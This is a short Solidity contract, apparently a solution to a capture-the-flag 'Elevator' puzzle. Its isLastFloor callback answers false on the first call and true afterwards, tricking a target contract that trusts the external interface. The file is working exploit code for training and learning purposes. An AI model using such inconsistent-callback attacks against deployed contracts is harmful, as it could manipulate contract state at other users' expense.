// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IElevator {
  function goTo(uint _floor) external;
}

contract ElevatorAttacker {
  bool firstCall = true;
  IElevator elevator;

  event Log(string _msg);
  event Snd(string _msg);

  constructor(address _address) {
    elevator = IElevator(_address);
  }

  function attack(uint _floor) public {
    emit Log("go to floor");
    elevator.goTo(_floor);
  }

  function isLastFloor(uint) public returns (bool) {
      if (firstCall) {
        firstCall = false;
        emit Log("return false on first call");
        return false; // return false the first time
      }
      emit Log("return true on subsequent call");
      return true; // always return true afterwards
  }

}
